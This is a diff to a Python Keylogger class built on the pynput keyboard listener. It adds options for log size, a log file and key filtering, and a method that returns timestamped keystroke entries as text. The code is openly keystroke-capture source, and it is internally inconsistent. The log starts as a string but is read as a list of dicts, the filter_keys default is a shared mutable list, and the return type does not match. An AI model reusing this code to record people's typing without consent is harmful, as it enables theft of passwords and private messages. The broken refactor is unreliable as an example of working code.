@@ -1,17 +1,24 @@
 from pynput import keyboard
 import threading, json
-from typing import Optional
+from typing import Optional, List
 from datetime import datetime
 
 
 class Keylogger:
-    def __init__(self) -> None:
+    def __init__(
+        self,
+        max_log_size: int = 10000,
+        log_file: Optional[str] = None,
+        filter_keys: Optional[List[str]] = [],
+    ) -> None:
         self._listener: Optional[keyboard.Listener] = None
         self._thread: Optional[threading.Thread] = None
         self.is_listening = False
         self.log = ""
         self._stop_event = threading.Event()
-        self.filter_keys = []
+        self.filter_keys = filter_keys
+        self.max_log_size = max_log_size
+        self.log_file = log_file
 
     def _on_press(self, key) -> None:
         try:
@@ -62,5 +69,9 @@ class Keylogger:
             if self._thread:
                 self._thread.join()
 
-    def get_log(self) -> str:
+    def get_log(self, as_string: bool = False) -> str | List[dict]:
+        if as_string:
+            return "\n".join(
+                [f"{entry['timestamp']}: {entry['key']}" for entry in self.log]
+            )
         return self.log
